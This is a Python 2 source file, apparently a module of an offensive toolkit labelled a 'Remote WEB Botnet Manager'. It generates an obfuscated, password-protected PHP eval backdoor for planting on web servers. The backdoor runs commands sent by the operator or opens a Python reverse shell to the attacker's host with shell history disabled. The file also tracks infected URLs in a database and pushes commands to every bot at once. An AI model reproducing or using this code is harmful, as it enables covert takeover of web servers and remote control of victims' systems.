# -*- coding: utf-8 -*-
import sys
import sqlite3
import base64
import requests
import thread
sys.path.append('.')
from config import config
from tabulate import tabulate

class module(config):


####Init configuration####
    def __init__(self):
        self.targets=[]
        self.payload = 'import pty,socket,os; host = ">>>IP<<<"; port = >>>PORT<<<; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((host,port));s.send("linuxPayload");os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.send("!exit");s.close()'
        self.config = config()
        self.con = sqlite3.connect(self.config.getPath()+"/db/"+"webot.db");
        self.cur = self.con.cursor()
        self.mainMessage()
        self.preExecution()
##########################

####User define information####
    def preExecution(self):
        while(True):
            self.targets = self.cur.execute("Select * from Bots").fetchall();
            option = raw_input("> ")
            if(option=="exit"):
                exit(0)

            if(option=="help"):

                print("generate             --> Create PHP Payload")
                print("add bot              --> Add Bot")
                print("del bot {BotID}      --> Delete Bot / 0 remove all")
                print("show bots            --> Show Bots")
                print("send COMMAND         --> Send Command for all Bots")
                print("send COMMAND {BotID} --> Send Command for specific Bot")
                print("exploit              --> Get all Sessions")
                print("exploit {BotID}      --> Get Session for specific Bot")
                print("info                 --> Show info of module")
                print("exit                 --> Close Module")

            if(option.find("generate")>-1):
                password = raw_input("Password: ")
                self.payload = self.payload.replace('>>>IP<<<',self.config.getHost())
                self.payload = self.payload.replace('>>>PORT<<<',str(self.config.getPort()))


                phPaylad = """if(isset($_POST['ic'])){
            if($_POST['ic']=='"""+base64.b64encode(password)+"""'){
               if(isset($_POST['cq'])){
                    system(base64_decode($_POST['cq']));
               }else{
                    system(base64_decode('cHl0aG9uIC1j')." '".base64_decode('"""+base64.b64encode(self.payload)+"""')."'");
                }
            }

    }"""
                evalCode="<?php eval(base64_decode('"+base64.b64encode(phPaylad)+"'));?>"
                print "\n[*][*][*][*][*] PAYLOAD [*][*][*][*][*]\n"
                print evalCode

            if(option.find("add bot")>-1):
                url = raw_input("Infected URL: ")
                password = raw_input("Password: ")
                sql = "Insert into Bots (url,password) values('%s','%s')" % (url,password);
                self.cur.execute(sql)
                self.con.commit()


            if(option.find("del bot")>-1):
                params = option.split(" ")
                id = params[2];
                if(id == "0"):
                    sql = "Delete from Bots";
                else:
                    sql = "Delete from Bots where id="+id;

                self.cur.execute(sql)
                self.con.commit()

            if(option.find("show bots")>-1):
                if(len(self.targets)!=0):
                        print tabulate(self.targets, ["id", "Url", "Password"], tablefmt="grid")
                else:
                    print "No Bots"

            if(option=="info"):
                print "[*] Remote WEB Botnet Manager"
                print "[*] by hdbreaker"

            if(option.find("send")>-1):
                id = 0;
                params = option.split(" ")
                try:
                    if(isinstance( int(params[len(params)-1]), int )):
                        id = int(params[len(params)-1])
                except:
                    pass
                params[0]="";
                params.remove('')
                data = ' '.join(params)
                self.sendCommand(data,id-1)

            if(option.find("exploit")>-1):
                id = 0;
                params = option.split(" ")
                if(len(params)==2):
                    id = params[1];
                self.exploit(int(id)-1)
###################################

###Exploit c0de###
    def exploit(self,id):
        self.getSessions(id)

####def custom user functions (calleable from exploit())####
    def sendCommand(self,cmd,id):
        if(id==-1):
            try:
                print "\n[*][*][*][*][*] SEND COMMAND TO ALL BOTS [*][*][*][*][*]"
                for target in self.targets:
                    print "\n[*] Send data to Bot %s" % (target[1])

                    data = {
                        'ic' : base64.b64encode(target[2]),
                        'cq' : base64.b64encode(cmd)
                    }

                    r = requests.post(target[1],data=data)
                    if(r.status_code == 200):
                        print "[*] STATUS CODE: " + str(r.status_code) + " DONE"
                    else:
                        if(r.status_code == 404):
                            print "[*] STATUS CODE: " + str(r.status_code) + " NOT FOUND"
                        else:
                            print "[*] STATUS CODE: " + str(r.status_code) + " ERROR"
            except:
                print "[-] ERROR SENDING COMMAND TO %s " % (target[1])
        else:
            try:
                print "\n[*] SEND COMMAND TO %s" % (self.targets[id][1])

                data = {
                    'ic' : base64.b64encode(self.targets[id][2]),
                    'cq' : base64.b64encode(cmd)
                }
                r = requests.post(self.targets[id][1],data=data)
                if(r.status_code == 200):
                    print "[*] STATUS CODE: " + str(r.status_code) + " DONE"
                else:
                    if(r.status_code == 404):
                        print "[*] STATUS CODE: " + str(r.status_code) + " NOT FOUND"
                    else:
                        print "[*] STATUS CODE: " + str(r.status_code) + " ERROR"

            except:
                print "[-] ERROR SENDING COMMAND TO %s " % (self.targets[id][1])

    def getSessions(self,id):
        if(id==-1):
            try:
                print "\n[*][*][*][*][*] GETTING SESSIONS FROM ALL BOTS [*][*][*][*][*]"
                for target in self.targets:
                    print "\n[*] Send password to Bot %s" % (target[1])
                    thread.start_new(self.postRequest,(target[1],target[2]))
            except:
                print "[-] ERROR SENDING PASSWORD TO %s " % (target[1])
        else:
            try:
                print "\n[*] GETTING SESSION FROM %s" % (self.targets[id][1])
                thread.start_new(self.postRequest,(self.targets[id][1],self.targets[id][2]))


            except:
                print "[-] ERROR SENDING PASSWORD TO %s " % (self.targets[id][1])

    def postRequest(self,bot,passwd):
        data = {
                    'ic' : base64.b64encode(passwd),
                }
        r = requests.post(bot,data=data)
        if(r.status_code != 200):
            print "[*] INFECTED FILE: " + str(r.status_code) + " NOT FOUND"

    def mainMessage(self):
        print"""
  _____                ______         _____          _____   _________________
 |\    \   _____   ___|\     \   ___|\     \    ____|\    \ /                 \\
 | |    | /    /| |     \     \ |    |\     \  /     /\    \\\\______     ______/
 \/     / |    || |     ,_____/||    | |     |/     /  \    \  \( /    /  )/
 /     /_  \   \/ |     \--'\_|/|    | /_ _ /|     |    |    |  ' |   |   '
|     // \  \   \ |     /___/|  |    |\    \ |     |    |    |    |   |
|    |/   \ |    ||     \____|\ |    | |    ||\     \  /    /|   /   //
|\ ___/\   \|   /||____ '     /||____|/____/|| \_____\/____/ |  /___//
| |   | \______/ ||    /_____/ ||    /     || \ |    ||    | / |`   |
 \|___|/\ |    | ||____|     | /|____|_____|/  \|____||____|/  |____|
    \(   \|____|/   \( |_____|/   \(    )/        \(    )/       \(
     '      )/       '    )/       '    '          '    '         '
            '             '                                                    """

#############################################################

#####Init Module#####
start = module()
#####################